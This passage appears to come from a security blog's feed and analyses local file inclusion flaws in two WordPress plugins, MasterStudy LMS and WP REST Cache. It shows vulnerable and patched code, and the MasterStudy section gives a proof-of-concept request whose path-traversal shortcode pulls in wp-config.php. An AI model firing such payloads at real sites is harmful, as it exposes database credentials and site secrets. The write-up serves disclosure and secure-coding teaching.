);&#xA;    ob_start();&#xA;    STM_LMS_Templates::stm_lms_load_vc_element( &amp;#39;courses_categories&amp;#39;, $atts, $atts[&amp;#39;style&amp;#39;] );&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, the shortcode callback &lt;code&gt;stm_lms_courses_categories&lt;/code&gt; directly passes the &lt;code&gt;style&lt;/code&gt; value from &lt;code&gt;$atts&lt;/code&gt; into &lt;code&gt;STM_LMS_Templates::stm_lms_load_vc_element()&lt;/code&gt; without sanitization or validation — leading to a potential LFI.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched Version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;add_shortcode( &amp;#39;stm_lms_courses_categories&amp;#39;, &amp;#39;stm_lms_courses_categories_shortcode&amp;#39; );&#xA;function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = &amp;#39;&amp;#39; ) {&#xA;&#x9;$atts = shortcode_atts(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;style&amp;#39;    =&amp;gt; &amp;#39;style_1&amp;#39;,&#xA;&#x9;&#x9;),&#xA;&#x9;&#x9;$atts,&#xA;&#x9;&#x9;$tag&#xA;&#x9;);&#xA;&#x9;$atts[&amp;#39;style&amp;#39;] = basename( sanitize_file_name( $atts[&amp;#39;style&amp;#39;] ) );&#xA;&#x9;ob_start();&#xA;&#x9;STM_LMS_Templates::stm_lms_load_vc_element( &amp;#39;courses_categories&amp;#39;, $atts, $atts[&amp;#39;style&amp;#39;] );&#xA;&#x9;return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch sanitizes &lt;code&gt;$atts[&#39;style&#39;]&lt;/code&gt; using &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_file_name/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt;&lt;/a&gt;, removing unsafe characters and preventing LFI.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = &amp;#39;&amp;#39;, $custom_path = &amp;#39;&amp;#39; ) {&#xA;    extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract&#xA;    $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path );&#xA;    if ( ! file_exists( $element ) &amp;amp;&amp;amp; strpos( $__template_name, &amp;#39;style_&amp;#39; ) !== false ) {&#xA;        $element = str_replace( $__template_name, &amp;#39;style_1&amp;#39;, $element );&#xA;    }&#xA;    if ( file_exists( $element ) ) {&#xA;        include $element;&#xA;    } else {&#xA;        echo esc_html__( &amp;#39;Element not found in&amp;#39;, &amp;#39;masterstudy-lms-learning-management-system&amp;#39; );&#xA;        echo esc_html( &amp;#39; &amp;#39; . $element );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;include()&lt;/code&gt; statement uses &lt;code&gt;$element&lt;/code&gt; returned from &lt;code&gt;stm_lms_locate_vc_element()&lt;/code&gt;, which is influenced by &lt;code&gt;$__template_name&lt;/code&gt; (the &lt;code&gt;style&lt;/code&gt; parameter from the shortcode). Without validation, an attacker can manipulate it to include arbitrary files, leading to LFI.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function stm_lms_locate_vc_element( $templates, $template_name = &amp;#39;&amp;#39;, $custom_path = &amp;#39;&amp;#39; ) {&#xA;    $located = false;&#xA;&#xA;    foreach ( (array) $templates as $template ) {&#xA;&#xA;        $folder = $template;&#xA;&#xA;        if ( ! empty( $template_name ) ) {&#xA;            $template = $template_name;&#xA;        }&#xA;&#xA;        if ( substr( $template, -4 ) !== &amp;#39;.php&amp;#39; ) {&#xA;            $template .= &amp;#39;.php&amp;#39;;&#xA;        }&#xA;&#xA;        if ( empty( $custom_path ) ) {&#xA;            $located = locate_template( &amp;#39;partials/vc_parts/&amp;#39; . $folder . &amp;#39;/&amp;#39; . $template );&#xA;            if ( ! ( $located ) ) {&#xA;                $located = STM_LMS_PATH . &amp;#39;/includes/shortcodes/partials/&amp;#39; . $folder . &amp;#39;/&amp;#39; . $template;&#xA;            }&#xA;        } else {&#xA;            $located = locate_template( $custom_path );&#xA;            if ( ! ( $located ) ) {&#xA;                $located = STM_LMS_PATH . &amp;#39;/&amp;#39; . $custom_path . &amp;#39;.php&amp;#39;;&#xA;            }&#xA;        }&#xA;&#xA;        if ( file_exists( $template_name ) ) {&#xA;            break;&#xA;        }&#xA;    }&#xA;&#xA;    return apply_filters( &amp;#39;stm_lms_locate_vc_element&amp;#39;, $located, $templates );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;stm_lms_locate_vc_element()&lt;/code&gt; function determines and returns the path of the template file (&lt;code&gt;.php&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;$template_name&lt;/code&gt; is provided, it &lt;strong&gt;overrides the default template name&lt;/strong&gt; and ensures it ends with &lt;code&gt;.php&lt;/code&gt;. The resulting file path becomes &lt;code&gt;STM_LMS_PATH/includes/shortcodes/partials/{folder}/{template}.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;For example, with &lt;code&gt;style=payload&lt;/code&gt;, it returns:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/srv/www/wordpress/wp-content/plugins/masterstudy-lms-learning-management-system/_core/includes/shortcodes/partials/courses_categories/payload.php&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a post with a shortcode that includes an LFI payload in the &lt;code&gt;style&lt;/code&gt; attribute:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp/v2/posts/260?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;&#xA;{&amp;#34;id&amp;#34;:260,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:shortcode --&amp;gt;\n[stm_lms_courses_categories taxonomy=x style=../../../../../../../../wp-config]\n&amp;lt;!-- /wp:shortcode --&amp;gt;\n\n&amp;lt;!-- wp:paragraph --&amp;gt;\n&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;The debugger hits &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-21-cve-2025-32141/result.png&#34; title=&#34;Successful LFI result&#34; data-thumbnail=&#34;/posts/2025-10-21-cve-2025-32141/result.png&#34; data-sub-html=&#34;&lt;h2&gt;/posts/2025-10-21-cve-2025-32141/result.png&lt;/h2&gt;&lt;p&gt;Successful LFI result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-21-cve-2025-32141/result.png&#39; alt=&#34;/posts/2025-10-21-cve-2025-32141/result.png&#34; height=&#34;319&#34; width=&#34;1341&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Successful LFI result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Versions &lt;strong&gt;≤ 3.5.28&lt;/strong&gt; of MasterStudy LMS are vulnerable to LFI via the &lt;code&gt;style&lt;/code&gt; parameter in the shortcode due to unsanitized input used in an &lt;code&gt;include&lt;/code&gt; statement. The patch in &lt;strong&gt;3.5.29&lt;/strong&gt; sanitizes this input using &lt;code&gt;sanitize_file_name()&lt;/code&gt; and &lt;code&gt;basename()&lt;/code&gt;, preventing unauthorized file access.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never concatenate user input directly into file paths.&lt;/li&gt;&#xA;&lt;li&gt;Always sanitize or whitelist values before using them in &lt;code&gt;include&lt;/code&gt; or &lt;code&gt;require&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Validate the resolved path to ensure it stays within the intended directory.&lt;/li&gt;&#xA;&lt;li&gt;Update to &lt;strong&gt;v3.5.29&lt;/strong&gt; to eliminate this LFI vulnerability.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/masterstudy-lms-learning-management-system/vulnerability/wordpress-masterstudy-lms-plugin-3-5-23-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MasterStudy LMS Plugin &amp;lt;= 3.5.28 is vulnerable to Local File Inclusion&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52716 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-20-cve-2025-52716/</link>
      <pubDate>Mon, 20 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-20-cve-2025-52716/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-20-cve-2025-52716/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;WP REST Cache&lt;/strong&gt; plugin version &lt;strong&gt;≤ 2025.1.0&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability that allows an unauthenticated attacker to control the file parameter used in &lt;code&gt;include/require&lt;/code&gt;, thereby injecting or reading local files on the server (e.g., configuration files containing credentials), leading to leakage of sensitive information and, in some configurations, possible code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52716&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52716&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2025.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2025.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-rest-cache/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP REST Cache Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WP REST Cache&lt;/strong&gt;: &lt;strong&gt;2025.1.0&lt;/strong&gt; (vulnerable) and &lt;strong&gt;2025.1.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to inspect differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function settings_page() {&#xA;    $this-&amp;gt;settings_panels = apply_filters( &amp;#39;wp_rest_cache/settings_panels&amp;#39;, $this-&amp;gt;settings_panels );&#xA;&#xA;    $sub = filter_input( INPUT_GET, &amp;#39;sub&amp;#39;, FILTER_SANITIZE_FULL_SPECIAL_CHARS );&#xA;    if ( empty( $sub ) ) {&#xA;        $sub = &amp;#39;settings&amp;#39;;&#xA;    }&#xA;    include_once __DIR__ . &amp;#39;/partials/header.php&amp;#39;;&#xA;    if ( isset( $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;] ) ) {&#xA;        include_once $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;];&#xA;    } elseif ( file_exists( __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39; ) ) {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    } else {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-settings.php&amp;#39;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, &lt;code&gt;$sub&lt;/code&gt; is the value returned by &lt;a href=&#34;https://www.php.net/manual/en/function.filter-input.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;filter_input()&lt;/code&gt;&lt;/a&gt; taken from the GET parameter (&lt;code&gt;?sub=...&lt;/code&gt;) in the URL using the filter &lt;a href=&#34;https://www.w3schools.com/php/filter_sanitize_special_chars.asp&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;FILTER_SANITIZE_FULL_SPECIAL_CHARS&lt;/code&gt;&lt;/a&gt;, which escapes &lt;code&gt;&amp;quot;&amp;lt;&amp;gt;&amp;amp;&lt;/code&gt; and characters with ASCII values below 32. This filter does not remove &lt;code&gt;.&lt;/code&gt; (46) or &lt;code&gt;/&lt;/code&gt; (47).&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$sub&lt;/code&gt; is concatenated into a string with the &lt;code&gt;&#39;.php&#39;&lt;/code&gt; suffix and then &lt;code&gt;include_once&lt;/code&gt;d without any protection against &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function settings_page() {&#xA;    $this-&amp;gt;settings_panels = apply_filters( &amp;#39;wp_rest_cache/settings_panels&amp;#39;, $this-&amp;gt;settings_panels );&#xA;&#xA;    $sub = filter_input( INPUT_GET, &amp;#39;sub&amp;#39;, FILTER_SANITIZE_FULL_SPECIAL_CHARS );&#xA;    if ( empty( $sub ) ) {&#xA;        $sub = 